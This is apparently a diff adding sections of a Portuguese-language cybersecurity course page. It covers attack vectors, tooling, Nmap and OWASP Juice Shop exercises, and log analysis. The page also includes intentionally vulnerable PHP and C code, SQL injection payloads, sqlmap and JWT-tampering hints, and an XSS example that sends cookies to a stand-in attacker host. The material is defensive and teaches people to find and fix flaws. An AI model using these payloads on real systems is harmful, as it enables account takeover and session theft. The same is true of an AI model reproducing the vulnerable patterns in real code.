+  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:1rem;margin-top:1rem;">
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">🎣</span> Phishing</div>
+      <p>Enganar a <span class="highlight">pessoa</span> (não o sistema). E-mail falso,
+        SMS, site clonado. A víctima clica e entrega credenciais ou instal doesn malware.
+        <span class="warn">~90% dos incidentes começam com phishing</span> (dados variados).
+        Ex: e-mail falso do "banco" pedindo senha.</p>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">🔑</span> Senhas fracas / reutilizadas</div>
+      <p>Senha "123456", "senha", data de nascimento. Ataque de <span class="highlight">força bruta</span>
+        (testar milhões de combinações) ou <span class="highlight">credential stuffing</span>
+        (usar senhas vazadas de OUTRO site para acessar a sua conta aqui).
+        <span class="warn">Uau: se você usa a mesma senha no banco e no forumzinho, um vazamento do forum leva ao banco.</span></p>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">💉</span> Injeção (SQLi, XSS, Command Injection)</div>
+      <p>Enviar <span class="highlight">dados maliciosos</span> que o sistema interpreta como comando.
+        SQL Injection: insere SQL malicious no campo de formulário para ler/alterar o banco.
+        XSS: injeta JavaScript no site que roda no navegador das vítimas.
+        <span class="danger">AAA: OWASP Top 10 sempre lista injeção no top 3.</span></p>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">🔓</span> Software desatualizado (vulnerabilidades conhecidas)</div>
+      <p>Existe uma falha conhecida no sistema X, e o patch já está disponível há meses.
+        Mas a empresa não atualizou. O atacante usa a falha conhecida.
+        <span class="warn">WannaCry (2017)Explorou uma falha do Windows que Microsoft já tinha corrigido</span>
+        — só atacou quem não havia atualizado.
+      </p>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">📡</span> DDoS (Distributed Denial of Service)</div>
+      <p>Encaregar um serviço com <span class="highlight">tráfego falso massivo</span> para derrubá-lo.
+        Usa botnets (milhares de dispositivos infectados) para atacar simultaneamente.
+        Afeta <span class="highlight">Disponibilidade</span> diretamente.
+        Ex: ataques ao Dyn DNS em 2016 derrubaram grande parte da internet.
+      </p>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">🖥️</span> Engineering Social (hocie humana)</div>
+      <p>Manipular pessoas para revelar informação ou fazer ação.
+        Pretexting: fingir ser suporte técnico. Baiting: deixar USB infectado no estacionamento
+        com label "Folha de Pagamento Q3" — alguém insere.
+        <span class="highlight">A pessoa é o eslabão mais fraco da maioria dos sistemas.</span></p>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">📱</span> Malware (vírus, worm, trojan, ransomware)</div>
+      <p>Programa malicioso. <span class="highlight">Trojan</span> finge ser legítimo.
+        <span class="highlight">Ransomware</span> criptografa seus dados e pede resgate.
+        <span class="highlight">Worm</span> se propaga sozinho pela rede.
+        <span class="highlight">Spyware</span> esconde e vigia (keylogger, webcam).
+      </p>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">🔗</span> Supply Chain Attack</div>
+      <p>Comprometer um <span class="highlight">fornecedor confiável</span> para atingir seus clientes.
+        Ex: SolarWinds (2020) — hackers injetaram backdoor no software de gestão,
+        que foi distribuído a 18.000+ organizações, incluindo gov dos EUA.
+        <span class="danger">Difícil de detectar porque a atualização vem de fonte confiável.</span></p>
+    </div>
+
+  </div>
+
+  <div class="callout danger">
+    <strong>🔥 Lição mais importante:</strong>
+    Quase todo incidente usa um <span class="highlight">vetor básico</span> executado bem.
+    Phishing + senha reutilizada. Software sem patch. Erro de configuração.
+    <span class="highlight">Segurança robusta começa com o básico bem feito.</span>
+  </div>
+
+  <div class="exercise">
+    <span class="exercise-badge badge-easy">Exercício 03 — Fácil</span>
+    <h3>Exercício: Identifique o vetor</h3>
+    <p class="desc">Leia cada cenário e identifique o vetor de ataque principal.</p>
+    <div class="goal"><strong>🎯 Objetivo:</strong> Reconhecer vetores rápido — habilidade básica do analyst.</div>
+    <ol class="step-list">
+      <li>Cenário A:Funcionária recebe e-mail aparentemente do CFO pedindo transferência urgente.
+        Ela faz a transferência. Depois descobre que o e-mail era falso.</li>
+      <li>Cenário B: Um formulário de login em um site aceita o input: <code>' OR '1'='1</code>
+        no campo de senha e devolve todos os usuários do banco.</li>
+      <li>Cenário C: Um site de e-commerce fica lento e cai porque recebeu milhões de requisições
+        simultâneas de IPs distribuídos ao redor do mundo.</li>
+      <li>Cenário D: Uma empresa usa um antivírus desatualizado que não reconhece uma variante nova
+        de ransomware. O ransomware entra por um e-mail de phishing que a vítima abriu.</li>
+      <li>Para cada: vetor principal, pilar CIA afetado, e uma medida de defesa básica.</li>
+    </ol>
+    <div class="solution-toggle" onclick="toggleSol(this)">Mostrar resposta modelo</div>
+    <div class="solution-content"><span class="comment">
+A — Phishing + Engenharia Social (Business Email Compromise).
+     CIA: Integridade financeira / confidencialidade.
+     Defesa: validação de segunda via (ligar para o CFO em número conhecido),
+            treinamento, política de transferências com aprovação dual.
+
+B — SQL Injection.
+     CIA: Confidencialidade (vazamento de dados), Integridade (podem alterar dados).
+     Defesa: uso de prepared statements / ORM, validação de input, WAF.
+
+C — DDoS.
+     CIA: Disponibilidade.
+     Defesa: proteção DDoS (Cloudflare, AWS Shield), rate limiting, CDN.
+
+D — Malware (Ransomware) entrado por phishing + falta de atualização.
+     CIA: Confidencialidade, Integridade, Disponibilidade.
+     Defesa: atualização de software, backups isolados (imutáveis),
+            segmentação de rede, MFA, treinamento contra phishing.
+    </span></div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════ -->
+<!-- SEÇÃO 4: FERRAMENTAS — O QUE O PROFISSIONAL USA   -->
+<!-- ══════════════════════════════════════════════════ -->
+<section class="section" id="ferramentas">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(52,211,153,0.15);color:var(--green);border:1px solid rgba(52,211,153,0.3);">04</div>
+    <h2>Ferramentas do Ofício</h2>
+    <span class="tag tag-basics">Básico</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">🛠️</span> As ferramentas mudam, os conceitos permanecem</div>
+    <p>
+      Ferramentas são <span class="highlight">meios</span>, não fins. Um bom analista sabe
+      <span class="highlight">o que</span> está procurando, não apenas <span class="highlight">como</span> clicar.
+      Abaixo, as categorias essenciais. Muitas são gratuitas e open-source.
+    </p>
+  </div>
+
+  <div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:1rem;">
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">🔎</span> Reconhecimento / OSINT</div>
+      <p>Coletar informação pública sobre o alvo antes de qualquer coisa.</p>
+      <p style="font-size:0.85rem;font-family:monospace;background:rgba(0,0,0,0.3);padding:0.5rem;border-radius:6px;border:1px solid var(--border);">
+        <span class="cmd">whois</span> — dono do domínio<br>
+        <span class="cmd">nslookup / dig</span> — DNS records<br>
+        <span class="cmd">theHarvester</span> — emails, subdomínios<br>
+        <span class="cmd">Shodan</span> — dispositivos conectados na internet<br>
+        <span class="cmd">Google Dorking</span> — busca avançada no Google
+      </p>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">🕵️</span> Vulnerabilidade Scanning</div>
+      <p>Varrer sistemas em busca de falhas conhecidas.</p>
+      <div style="font-size:0.85rem;font-family:monospace;background:rgba(0,0,0,0.3);padding:0.5rem;border-radius:6px;border:1px solid var(--border);">
+        <span class="cmd">Nmap</span> — mapeamento de portas e rede (o clássico)<br>
+        <span class="cmd">Nessus</span> — scanner de vulnerabilidades (enterprise)<br>
+        <span class="cmd">OpenVAS</span> — alternativa open-source ao Nessus<br>
+        <span class="cmd">nikto</span> — scanner de servidores web<br>
+        <span class="cmd">nuclei</span> — scanner baseado em templates (modo ninja)
+      </div>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">📦</span> Exploitation (uso de falhas)</div>
+      <p>Testar se uma vulnerabilidadedescoberta é realmente explorável.</p>
+      <div style="font-size:0.85rem;font-family:monospace;background:rgba(0,0,0,0.3);padding:0.5rem;border-radius:6px;border:1px solid var(--border);">
+        <span class="cmd">Metasploit Framework</span> — framework de exploração (o mais usado)<br>
+        <span class="cmd">Burp Suite</span> — proxy para testes de segurança web (community gratuito)<br>
+        <span class="cmd">SQLmap</span> — automatiza testes de SQL injection<br>
+        <span class="cmd">John the Ripper / Hashcat</span> — quebra de senhas (hash cracking)
+      </div>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">📝</span> Análise de Log e SIEM</div>
+      <p>Coletar e analisar registros de sistemas para detectar incidentes.</p>
+      <div style="font-size:0.85rem;font-family:monospace;background:rgba(0,0,0,0.3);padding:0.5rem;border-radius:6px;border:1px solid var(--border);">
+        <span class="cmd">Elastic Stack (ELK)</span> — Elasticsearch + Logstash + Kibana<br>
+        <span class="cmd">Splunk</span> — SIEM enterprise (muito usado, caro)<br>
+        <span class="cmd">Wazuh</span> — SIEM open-source (hot no momento)<br>
+        <span class="cmd">Syslog</span> — protocolo padrão de log<br>
+        <span class="cmd">GoAccess / AWStats</span> — logs de web server
+      </div>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">🚨</span> Resposta a Incidentes</div>
+      <p>Investigar, conter e remover um incidente em andamento.</p>
+      <div style="font-size:0.85rem;font-family:monospace;background:rgba(0,0,0,0.3);padding:0.5rem;border-radius:6px;border:1px solid var(--border);">
+        <span class="cmd">Volatility</span> — análise de memória RAM (forense)<br>
+        <span class="cmd">Autopsy / The Sleuth Kit</span> — análise de disco<br>
+        <span class="cmd">Wireshark</span> — análise de tráfego de rede (pacotes)<br>
+        <span class="cmd">tcpdump</span> — captura de pacotes via CLI<br>
+        <span class="cmd">YaYa (YARA)</span> — detecção de malware por assinaturas
+      </div>
+    </div>
+
+    <div class="card" style="margin-bottom:0;">
+      <div class="card-title"><span class="icon">🔐</span> Criptografia</div>
+      <p>Proteção de dados em repouso e em trânsito.</p>
+      <div style="font-size:0.85rem;font-family:monospace;background:rgba(0,0,0,0.3);padding:0.5rem;border-radius:6px;border:1px solid var(--border);">
+        <span class="cmd">GnuPG (GPG)</span> — criptografia de ponta a ponta<br>
+        <span class="cmd">OpenSSL</span> — toolkit criptográfico (TLS, certificados)<br>
+        <span class="cmd">cryptsetup / LUKS</span> — criptografia de disco no Linux<br>
+        <span class="cmd">VeraCrypt</span> — volumes criptografados (Windows/Linux/macOS)<br>
+        <span class="cmd">HashiCorp Vault</span> — gerenciamento de secrets
+      </div>
+    </div>
+
+  </div>
+
+  <div class="callout info">
+    <strong>📌 Dica de ouro:</strong>
+    Não tente aprender todas as ferramentas de uma vez. Comece por: <span class="highlight">Nmap + Burp Suite Community + Wireshark</span>.
+    Essas três dão uma base enorme para segurança de rede e web. O resto vem com a prática.
+  </div>
+
+  <div class="exercise">
+    <span class="exercise-badge badge-easy">Exercício 04 — Fácil</span>
+    <h3>Exercício: Instale e explore Nmap</h3>
+    <p class="desc">Nmap ("Network Mapper") é a ferramenta mais fundamental de segurança de rede.
+      Antes de qualquer análise, você precisa saber <span class="highlight">o que está exposto na rede</span>.</p>
+    <div class="goal"><strong>🎯 Objetivo:</strong> Instalar Nmap, escanear sua própria máquina ou uma VM de prática, e interpretar os resultados.</div>
+    <ol class="step-list">
+      <li>Instale o Nmap (Windows: baixe em nmap.org; Linux: <code>sudo apt install nmap</code>; Mac: <code>brew install nmap</code>).</li>
+      <li>Abra um terminal e rode: <code>nmap -sV -O localhost</code><br>
+          <span style="color:var(--text2);font-size:0.85rem;">-sV: detecta versão dos serviços | -O: detecta SO (requer privilégio)</span></li>
+      <li>Leia a saída: quantas portas foram encontradas? Quais serviços estão rodando?</li>
+      <li>Rode também: <code>nmap -sS -p 1-1000 localhost</code><br>
+          <span style="color:var(--text2);font-size:0.85rem;">-sS: SYN scan (mais rápido/disquete) | -p: scope de portas</span></li>
+      <li>Pesquise o que significa cada estado de porta (open, closed, filtered) e escreva.</li>
+    </ol>
+    <div class="hint">Nmap scaneia apenas a sua própria máquina — isso é legal e seguro. Nunca use Nmap em redes que você não tem permissão explícita.</div>
+    <div class="solution-toggle" onclick="toggleSol(this)">Mostrar resposta modelo</div>
+    <div class="solution-content"><span class="comment">
+Exemplo de saída típica (sua será diferente):
+
+Starting Nmap 7.x on 192.168.1.x
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00020s latency).
+Not shown: 997 closed tcp ports
+
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 8.x
+80/tcp  open  http        Apache 2.4.x
+443/tcp open  https       nginx
+
+Portas abertas = serviços ouvindo na rede.
+Cada porta aberta é um possível vetor de ataque se mal configurado.
+
+Estados de porta:
+  open        = serviço aceitando conexão
+  closed      = porta acessível mas sem serviço ouvindo
+  filtered    = firewall/packet filter bloqueando — não se sabe se está aberta ou fechada
+  unfiltered  = porta acessível mas estado não pode ser determinado
+  open|filtered = Nmap não consegue distinguir open de filtered
+  closed|filtered = Nmap não consegue distinguir closed de filtered
+
+Nome "Nmap":Network Mapper — criado por Gordon Lyon ("Fyodor") em 1997.
+    </span></div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════ -->
+<!-- SEÇÃO 5: NÍVEL INTERMEDIÁRIO — VULNERABILIDADES REAIS E COMO EXPLORAR (ETICAMENTE) -->
+<!-- ══════════════════════════════════════════════════ -->
+<section class="section" id="intermediario">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(251,191,36,0.12);color:var(--yellow);border:1px solid rgba(251,191,36,0.25);">05</div>
+    <h2>Nível Intermediário — Vulnerabilidades Reais</h2>
+    <span class="tag tag-intermediate">Intermediário</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title"><span class="icon">📚</span> O que você precisa saber antes</div>
+    <p>
+      No nível intermediário você já entende os conceitos básicos. Agora vamos a
+      <span class="highlight">vulnerabilidades concretas</span>, como aparecem no mundo real,
+      e como as explorar <span class="highlight">em ambientes controlados e éticos</span>.
+    </p>
+    <div class="callout warning">
+      <strong>⚠️ Regra de ouro — ler antes de qualquer coisa:</strong>
+      Testar vulnerabilidades em sistemas que você <span class="danger">não tem permissão explícita</span>
+      é <span class="danger">crime</span> no Brasil (Lei 12.737/2012 — Lei Carolina Dieckmann) e na maioria dos países.
+      <span class="highlight">Sempre pratique em ambientes próprios ou com permissão escrita.</span>
+    </div>
+  </div>
+
+  <!-- SQL Injection -->
+  <div class="card">
+    <div class="card-title"><span class="icon">💉</span> SQL Injection (SQLi) — A vulnerabilidade clássica</div>
+    <p>
+      O desenvolvedor constrói uma query SQL juntando strings diretamente com input do usuário.
+      Se o input contém caracteres especiais (como <span class="highlight">'</span>), a query muda de sentido.
+    </p>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header">
+      <div class="dots"><span></span><span></span><span></span></div>
+      <span class="lang">login.php — VULNERÁVEL</span>
+    </div>
+    <pre><span class="comment"># O desenvolvedor constrói a query concatenando strings</span>
+<span class="keyword">$username</span> = $_POST[<span class="string">'user'</span>];
+<span class="keyword">$password</span> = $_POST[<span class="string">'pass'</span>];
+
+<span class="comment"># Aquery é construída com concatenação — PELIGRO</span>
+<span class="keyword">$query</span> = <span class="string">"SELECT * FROM users WHERE user='</span><span class="keyword">$username</span><span class="string">' AND pass='</span><span class="keyword">$password</span><span class="string">'"</span>;
+
+<span class="comment"># Se o atacante digita como usuário:   admin' --</span>
+<span class="comment"># A query resultante fica:</span>
+<span class="comment"># SELECT * FROM users WHERE user='admin' --' AND pass='...'</span>
+<span class="comment"># O--comenta o restante da query — a senha é ignorada!</span>
+
+<span class="keyword">$result</span> = mysqli_query(<span class="keyword">$conn</span>, <span class="keyword">$query</span>);
+<span class="keyword">$row</span> = mysqli_fetch_assoc(<span class="keyword">$result</span>);</pre>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header">
+      <div class="dots"><span></span><span></span><span></span></div>
+      <span class="lang">login.php — CORRIGIDO (Prepared Statement)</span>
+    </div>
+    <pre><span class="comment"># Agora usa prepared statement — o DB trata o input como DADO, não como código</span>
+<span class="keyword">$stmt</span> = $conn->prepare(<span class="string">"SELECT * FROM users WHERE user=? AND pass=?"</span>);
+<span class="keyword">$stmt</span>->bind_param(<span class="string">"ss"</span>, <span class="keyword">$username</span>, <span class="keyword">$password</span>);
+<span class="keyword">$stmt</span>->execute();
+<span class="keyword">$result</span> = <span class="keyword">$stmt</span>->get_result();</pre>
+  </div>
+
+  <div class="callout success">
+    <strong>✅ Lição:</strong>
+    A diferença entre vulnerável e seguro é <span class="highlight">poucas linhas</span> — mas essas
+    linhas separam um site comprometido de um site seguro. <span class="highlight">Always use prepared statements</span>
+    para qualquer query com input externo.
+  </div>
+
+  <!-- XSS -->
+  <div class="card" style="margin-top:1.5rem;">
+    <div class="card-title"><span class="icon">🌐</span> Cross-Site Scripting (XSS) — Script injetado no navegador da vítima</div>
+    <p>
+      O site insere contente do usuário na página sem sanitizar. O navegador da vítima executa
+      o script como se fosse legítimo do site — rouba cookies, sessão, ou redireciona.
+    </p>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header">
+      <div class="dots"><span></span><span></span><span></span></div>
+      <span class="lang">search.php — VULNERÁVEL ao XSS</span>
+    </div>
+    <pre><span class="comment"># O site reflete o termo de busca na página sem sanitizar</span>
+<span class="keyword">$search</span> = $_GET[<span class="string">'q'</span>];
+
+<span class="comment"># HTML gerado — se $search contém <script>, roda no navegador da vítima</span>
+<span class="keyword">echo</span> <span class="string">"<h1>Resultados para: </span><span class="keyword">$search</span><span class="string"></h1>"</span>;
+
+<span class="comment"># Atacante envia link:   site.com/search.php?q=&lt;script&gt;fetch('http://seuserver.com/steal?c='+document.cookie)&lt;/script&gt;</span>
+<span class="comment"># Vítima clica — o script rouba o cookie de sessão e envia para o servidor do atacante.</span></pre>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header">
+      <div class="dots"><span></span><span></span><span></span></div>
+      <span class="lang">search.php — CORRIGIDO (escapando HTML)</span>
+    </div>
+    <pre><span class="keyword">$search</span> = $_GET[<span class="string">'q'</span>];
+<span class="comment"># htmlspecialchars converte < > & " ' em entidades HTML — o navegador mostra, não executa</span>
+<span class="keyword">echo</span> <span class="string">"<h1>Resultados para: </span>"</span> . htmlspecialchars(<span class="keyword">$search</span>, ENT_QUOTES, <span class="string">'UTF-8'</span>) . <span class="string">"</h1>"</span>;</pre>
+  </div>
+
+  <div class="callout warning">
+    <strong>⚠️ Tipos de XSS:</strong>
+    <strong>Reflected (Refletido):</strong> input vem da requisição (ex: parâmetro URL) e é refletido na resposta — exige que a vítima clique em um link.<br>
+    <strong>Stored (Armazenado):</strong> o script é salvo no servidor (ex: comentário de blog) e executado em todos que visualizam — mais perigoso.<br>
+    <strong>DOM-based:</strong> a vulnerabilidade está na manipulação do DOM pelo JavaScript do lado do cliente — o servidor não vê o payload.
+  </div>
+
+  <!-- Buffer Overflow -->
+  <div class="card" style="margin-top:1.5rem;">
+    <div class="card-title"><span class="icon">💥</span> Buffer Overflow — A vulnerabilidade "clássica dos clássicos"</div>
+    <p>
+      Um programa escrito em C/C++ reserva um buffer de tamanho fixo (ex: 64 bytes) para uma entrada.
+      Se o atacante envia <span class="highlight">mais dados que o buffer comporta</span>, os dados extra
+      sobrescrevem memória adjacente — incluindo <span class="highlight">o endereço de retorno da função (stack)</span>.
+      O atacante pode controlar <span class="highlight">para onde o programa salta</span> a qualquer momento.
+    </p>
+  </div>
+
+  <div class="code-block">
+    <div class="code-block-header">
+      <div class="dots"><span></span><span></span><span></span></div>
+      <span class="lang">vuln.c — Buffer Overflow (educacional)</span>
+    </div>
+    <pre><span class="comment">#include &lt;stdio.h&gt;</span>
+<span class="comment">#include &lt;string.h&gt;</span>
+
+<span class="keyword">void</span> <span class="cmd">vulnerable</span>() {
+    <span class="keyword">char</span> <span class="cmd">buffer</span>[<span class="flags">64</span>];  <span class="comment">// Buffer de 64 bytes — FIXO</span>
+
+    <span class="comment">// gets() não faz verificação de tamanho — PERIGO</span>
+    <span class="comment">// Se o input tiver >64 bytes, os extras sobrescrevem a stack</span>
+    <span class="cmd">gets</span>(<span class="cmd">buffer</span>);  <span class="comment">// gets()é deprecated por causa disso!</span>
+
+    <span class="keyword">printf</span>(<span class="string">"Você digitou: %s\n"</span>, <span class="cmd">buffer</span>);
+}
+
+<span class="keyword">int</span> <span class="cmd">main</span>() {
+    <span class="cmd">vulnerable</span>();
+    <span class="keyword">return</span> <span class="flags">0</span>;
+}</pre>
+  </div>
+
+  <div class="card">
+    <p style="margin-bottom:0.5rem;">
+      <span class="highlight">Como explorar (simplificado):</span> O atacante envia um input maior que 64 bytes.
+      Os primeiros 64 bytes enchem o buffer. Os bytes seguintes sobrescrevem o <span class="highlight">saved EBP</span>,
+      e depois o <span class="highlight">endereço de retorno</span> salvo na stack. Quando a função retorna, o
+      endereço de retorno aponta para o código do atacante (<span class="highlight">shellcode</span>) que ele
+      injetou no payload.
+    </p>
+    <p style="color:var(--text2);">
+      <span class="danger">Ataques reais usam NOP sled, ASLR bypass, DEP/NX bypass.</span>
+      No nível intermediário, o importante é <span class="highlight">entender o conceito</span> —
+      na prática, você usa ferramentas como <span class="highlight">GDB + pwntools</span> em CTFs.
+    </p>
+  </div>
+
+  <div class="callout danger">
+    <strong>🔥 Exploração em 3 linhas:</strong>
+    A maioria das vulnerabilidades reais se resume a: <span class="highlight">entrada não validada</span> +
+    <span class="highlight">interpretação como código</span> + <span class="highlight">contexto privilegiado</span>.
+    Entenda isso e você entende 80% das vulnerabilidades.
+  </div>
+
+  <div class="exercise">
+    <span class="exercise-badge badge-medium">Exercício 05 — Médio</span>
+    <h3>Exercício: OWASP Juice Shop (prática guiada)</h3>
+    <p class="desc">
+      O <span class="highlight">OWASP Juice Shop</span> é uma aplicação web intencionalmente vulnerável,
+      mantida pelo OWASP (organização que define padrões de segurança web). É o laboratório padrão
+      para aprender segurança web na prática.
+    </p>
+    <div class="goal"><strong>🎯 Objetivo:</strong> Rodar o Juice Shop localmente eresolver os primeiros 5 challenges.</div>
+    <ol class="step-list">
+      <li>Instale o Juice Shop: <code>npm install -g @owasp/juice-shop</code> ou use Docker:
+          <code>docker run --rm -p 3000:3000 bkimminich/juice-shop</code></li>
+      <li>Acesse <code>http://localhost:3000</code> no navegador.</li>
+      <li>Clique no ícone de "scoreboard" (🎯) para ver a lista de challenges.</li>
+      <li>Resolva na ordem sugerida:
+        <ol style="margin-top:0.3rem;color:var(--text2);">
+          <li>"Get an API token" — explore a API</li>
+          <li>"Login as a non-existing user" — SQLi básica no login</li>
+          <li>"Reset another user's password" — lógica de password reset</li>
+          <li>"View another user's shopping basket" — broken access control</li>
+          <li>"JWT token expiry" — manipulação de JWT</li>
+        </ol>
+      </li>
+      <li>Para cada, anote: qual vulnerabilidade, qual vetor de ataque, e como corrigir.</li>
+    </ol>
+    <div class="hint">O Juice Shop tem soluções passo a passo (“walkthroughs") em GitHub. Use como último recurso, não primeiro — tente resolver sozinho primeiro.</div>
+    <div class="solution-toggle" onclick="toggleSol(this)">Mostrar dicas para os primeiros challenges</div>
+    <div class="solution-content"><span class="comment">
+"Get an API token":
+  - Abra o console do navegador (F12) → aba Application → Cookies
+  - Encontre a cookie "token-api" (ou "Authorization" header)
+  - Você usará essa token nas próximas requisições para autenticar
+
+"Login as a non-existing user" (SQLi básica):
+  - Tente username: "admin' OR '1'='1" com qualquer senha
+  - Ou use o SQLmap: sqlmap -u "http://localhost:3000/rest/user/login" --data="username=x&password=y" --method POST
+  - O backend não usa prepared statement — o input altera a query
+
+"Reset another user's password":
+  - Examine o formulário de password reset: ele geralmente envia um token para o e-mail
+  - Teste se o token é previsível ou se você pode injetar um e-mail diferente no request
+  - Muitas vezes o endpoint aceita JSON: {"email": "admin@juice-shop.hacking"}
+  - Isso é "Broken Function Level Authorization" — o sistema não verifica se o solicitante é o próprio usuário
+
+"View another user's shopping basket":
+  - Faça login como um usuário, cadastre itens no carrinho
+  - Acessa o endpoint do carrinho de OUTRO usuário (ex: ID do usuário no URL ou parameter)
+  - Ex: GET /api/BasketItems/<id-de-outro-usuario>
+  - O sistema deve verificar se o request é do dono do carrinho — se não, é Broken Access Control (IDOR)
+
+"JWT token expiry":
+  - JWTs são assinados com uma chave secreta
+  - Teste se a aplicação aceita JWTs com algoritmos fracos (ex: "alg": "none" ou HS256 com chave conhecida)
+  - Ferramentas: jwt.io para decodificar/editar, jwt-crack para forcar a chave
+  - Muitas aplicações comem JWT com exp acionado — verifique se você pode criar um token que nunca expira
+
+Importante: tudo isso acontece em localhost — é seu próprio laboratório. NÃO faça isso em sites reais.
+    </span></div>
+  </div>
+
+  <div class="exercise">
+    <span class="exercise-badge badge-medium">Exercício 06 — Médio</span>
+    <h3>Exercício: Análise de logs básica</h3>
+    <p class="desc">
+      Um analista de segurança passa muito tempo olhando logs. Detectar incidentes nasce da capacidade
+      de <span class="highlight">ler padrões anormais</span>.
+    </p>
+    <div class="goal"><strong>🎯 Objetivo:</strong> Ler logs de servidor web e identificar atividade suspeita.</div>
+    <div class="code-block">
+      <div class="code-block-header">
+        <div class="dots"><span></span><span></span><span></span></div>
+        <span class="lang">access.log — alguns eventos</span>
+      </div>
+      <pre><span class="comment"># Formato Common Log Format:</span>
+<span class="comment"># IP - - [data] "metodo URL HTTP/versao" status tamanho "referrer" "user-agent"</span>
+
+10.0.0.5 - - [13/Sep/2026:10:00:01 +0000] "GET / HTTP/1.1" 200 5234 "-" "Mozilla/5.0..."
+10.0.0.5 - - [13/Sep/2026:10:00:02 +0000] "GET /about HTTP/1.1" 200 1204 "-" "Mozilla/5.0..."
+192.168.1.50 - - [13/Sep/2026:10:01:15 +0000] "GET /login HTTP/1.1" 200 3400 "-" "Mozilla/5.0..."
+203.0.113.42 - - [13/Sep/2026:10:02:30 +0000] "POST /login HTTP/1.1" 200 120 "https://example.com/login" "python-requests/2.28.0"
+203.0.113.42 - - [13/Sep/2026:10:02:31 +0000] "POST /login HTTP/1.1" 401 80 "https://example.com/login" "python-requests/2.28.0"
+203.0.113.42 - - [13/Sep/2026:10:02:32 +0000] "POST /login HTTP/1.1" 401 80 "https://example.com/login" "python-requests/2.28.0"
+203.0.113.42 - - [13/Sep/2026:10:02:33 +0000] "POST /login HTTP/1.1" 200 120 "https://example.com/login" "python-requests/2.28.0"
+203.0.113.42 - - [13/Sep/2026:10:02:34 +0000] "GET /admin/users HTTP/1.1" 200 8400 "https://example.com/login" "python-requests/2.28.0"
+198.51.100.10 - - [13/Sep/2026:10:05:00 +0000] "GET /search?q=%27%20OR%20%271%27%3D%271 HTTP/1.1" 200 2400 "-" "Mozilla/5.0..."
+198.51.100.10 - - [13/Sep/2026:10:05:01 +0000] "GET /search?q=%3Cscript%3Ealert(1)%3C/script%3E HTTP/1.1" 200 2400 "-" "Mozilla/5.0..."
+10.0.0.5 - - [13/Sep/2026:10:10:00 +0000] "GET / HTTP/1.1" 200 5234 "-" "Mozilla/5.0..."</pre>
+    </div>
+    <ol class="step-list" style="margin-top:0.8rem;">
+      <li>Identifique os IPs diferentes e o que Cada um fez.</li>
+      <li>O que é suspeito no comportamento de 203.0.113.42?</li>
+      <li>O que 198.51.100.10 está testando?</li>
+      <li>Escreva um alerta que você configuraria para detectar cada comportamento.</li>
+    </ol>
+    <div class="solution-toggle" onclick="toggleSol(this)">Mostrar resposta modelo</div>
+    <div class="solution-content"><span class="comment">
+IPs:
+  - 10.0.0.5   : navegação normal (home, about) — comportamento legítimo
+  - 192.168.1.50: acessou /login — comportamento normal de usuário
+  - 203.0.113.42: ATIVIDADE SUSPEITA — veja abaixo
+  - 198.51.100.10: ATIVIDADE SUSPEITA — veja abaixo
+
+203.0.113.42 (Suspicious):
+  - POST /login com user-agent "python-requests/2.28.0" (script automatizado, não navegador humano)
+  - Failed login (401) repetido 2x rápido, depois sucesso (200) — tentativa de força bruta ou credencial correta encontrada
+  - Imediatamente após login, acessa /admin/users — comportamento de privileged escalation ou exfiltração de dados
+  - 4 requisições em 5 segundos — velocidade inumana para humano
+  ALERTA: múltiplos failed logins seguidos de sucesso + acesso a recurso privilegiado em <5s
+
+198.51.100.10 (Suspicious):
+  - /search?q=%27%20OR%20%271%27%3D%271 = "' OR '1'='1" (SQLi test, URL-encoded)
+  - /search?q=%3Cscript%3Ealert(1)%3C/script%3E = "<script>alert(1)</script>" (XSS test, URL-encoded)
+  - Testando duas vulnerabilidades comuns em sequência — típico de scanner automatizado
+  ALERTA: request com caracteres especiais em campo de busca (SQL chars, script tags)
+
+Defesas:
+  - Rate limiting: bloqueia IP após N failed logins por minuto
+  - WAF (Web Application Firewall): detecta e bloqueia SQLi/XSS patterns
+  - SIEM: correlaciona failed login + acesso privilegiado no tempo
+  - User-agent analysis: bloqueia ou alerta requests com user-agent de automação em páginas sensíveis
+    </span></div>
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════════════════ -->
+<!-- SEÇÃO 6: NÍVEL AVANÇADO — REDE, FORENSE, MALWARE, IA -->
+<!-- ══════════════════════════════════════════════════ -->
+<section class="section" id="avancado">
+  <div class="section-header">
+    <div class="section-num" style="background:rgba(248,113,113,0.12);color:var(--red);border:1px solid rgba(248,113,113,0.25);">06</div>
+    <h2>Nível Avançado — Redes, Forense, Malware e Automação</h2>
+    <span class="tag tag-advanced">Avançado</span>
+  </div>
+
+  <div class="card">
